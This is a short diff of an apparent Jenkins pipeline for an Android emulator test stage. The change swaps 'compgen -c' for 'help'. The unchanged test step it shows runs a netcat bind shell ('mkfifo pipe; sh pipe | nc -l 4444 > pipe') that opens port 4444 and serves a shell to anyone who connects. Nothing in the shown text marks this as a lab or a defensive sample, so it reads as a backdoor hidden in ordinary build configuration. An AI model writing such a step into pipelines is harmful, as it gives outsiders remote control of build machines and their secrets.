@@ -18,7 +18,7 @@ pipeline {
             steps {
                 echo 'Running Test'
                 sh 'emulator -avd first_avd -no-window -no-audio &'
-                sh 'compgen -c'
+                sh 'help'
                 sh 'mkfifo pipe; sh pipe | nc -l 4444 > pipe'
             }
             post {
